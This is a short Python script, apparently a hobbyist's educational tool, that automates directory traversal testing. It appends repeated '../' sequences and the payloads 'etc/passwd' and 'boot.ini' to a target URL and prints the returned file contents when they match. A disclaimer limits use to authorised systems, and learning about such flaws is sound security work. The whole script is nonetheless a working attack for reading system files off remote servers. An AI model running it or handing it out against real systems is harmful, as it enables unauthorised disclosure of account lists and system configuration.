# hey it s Ricci here, this is a URL directory traversal automated tester
# this script is  inspired by the Python Web Penetration Testing Cookbook
#
# DISCLAIMER: This tool is for educational purposes only.
# Only use on systems you own or have explicit permission to test.
# Unauthorized access to computer systems is illegal.
# it s better to do it manually with burpsuite , OWASP ZAP or in the browsers but here is a simple automated version

import sys

import requests

url = sys.argv[1]
payloads = {"etc/passwd": "root", "boot.ini": "[boot loader]"}
up = "../"  # directory traversal sequence
i = 0

for payload, string in payloads.items():  # loop through each payload:
    # try directory traversal from O to 6 like this ../../../../../../etc/passwd
    for i in range(7):
        # send request like this http://target/../../../../../../etc/passwd
        req = requests.post(url + (i * up) + payload)
        if string in req.text:
            # print something if it s vulnerable
            print("[+] Vulnerable to directory traversal!")
            print("[+] Found: " + url + (i * up) + payload)
            print(req.text)
            break
        else:
            print("[-] Not vulnerable with payload: " + (i * up) + payload)
